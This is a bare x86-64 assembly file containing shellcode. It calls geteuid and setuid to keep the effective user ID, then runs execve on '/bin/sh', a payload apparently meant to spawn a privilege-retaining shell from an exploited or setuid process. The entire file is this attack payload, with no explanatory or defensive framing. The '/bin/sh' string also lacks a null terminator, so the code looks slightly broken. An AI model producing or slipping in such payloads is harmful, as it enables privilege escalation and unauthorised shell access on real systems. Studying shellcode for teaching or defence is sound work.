
	.global _start

	.text

_start:

	# rdi = geteuid()
	mov $107, %rax
	syscall

	# setuid(rdi)
	mov %rax, %rdi
	mov $105, %rax
	syscall

	# execve('/bin/sh', NULL, NULL)
	mov $59, %rax
	mov $sh, %rdi
	xor %rsi, %rsi
	xor %rdx, %rdx
	syscall

sh: 
	.ascii "/bin/sh"

